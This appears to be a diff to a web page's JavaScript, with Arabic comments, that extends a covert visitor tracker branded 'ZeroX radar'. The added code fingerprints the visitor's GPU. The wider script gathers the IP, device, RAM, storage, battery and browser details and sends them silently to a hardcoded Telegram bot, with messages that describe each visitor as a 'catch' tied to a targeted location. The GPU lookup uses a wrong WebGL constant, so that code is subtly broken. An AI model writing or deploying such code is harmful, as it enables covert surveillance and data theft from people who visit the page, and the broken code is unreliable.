@@ -143,6 +143,18 @@ const chatId = "7388801889";
      
         // --- كود قنص المساحة الخاص بـ ZeroX ---
 let storageInfo = "محجوب/غير مدعوم";
+// --- كود قنص نوع المعالج الرسومي (GPU) ---
+let gpuInfo = "غير معروف";
+try {
+    const canvas = document.createElement('canvas');
+    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+    if (debugInfo) {
+        gpuInfo = gl.getParameter(debugInfo.UNMASKED_RENDERER_ID);
+    }
+} catch (e) { gpuInfo = "محجوب من المتصفح"; }
+// -----------------------------------------
+
 try {
     if (navigator.storage && navigator.storage.estimate) {
         const estimate = await navigator.storage.estimate();
@@ -181,23 +193,24 @@ try {
         } catch (e) {}
 
         const megaMsg = `
-🚨 رادار ZeroX العملاق - دخول جديد!
+🚨 رادار ZeroX المطور - صيد دقيق!
 ----------------------------------
 🌐 الـ IP: ${ipAddr}
-🌐 نوع الشبكة: ${connection}
-📱 الجهاز/النظام: ${platform}
-🧠 نويات المعالج: ${cores} Core
+📡 الشبكة: ${connection}
+📱 النظام: ${platform}
+🧠 الأنوية: ${cores} Core
+🎮 المعالج (GPU): ${gpuInfo} 
+📟 الذاكرة (RAM): ${ram} GB
 💾 التخزين: ${storageInfo}
-📟 الذاكرة (RAM): ${ram} GB تقريباً
-🔋 حالة البطارية: ${batteryInfo}
+🔋 البطارية: ${batteryInfo}
 ----------------------------------
-🖥️ دقة الشاشة: ${screenRes}
-🎨 عمق الألوان: ${colorDepth} bit
-🌍 اللغة الأساسية: ${language}
+🖥️ الشاشة: ${screenRes}
+🌍 اللغة: ${language}
 🌐 المتصفح: ${ua}
 ----------------------------------
-📍 الموقع المستهدف: السلطان مول - رمضان 🌙
-        `;
+📍 المستهدف: السلطان مول - رمضان 🌙
+`;
+
         
         fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(megaMsg)}`);
     }
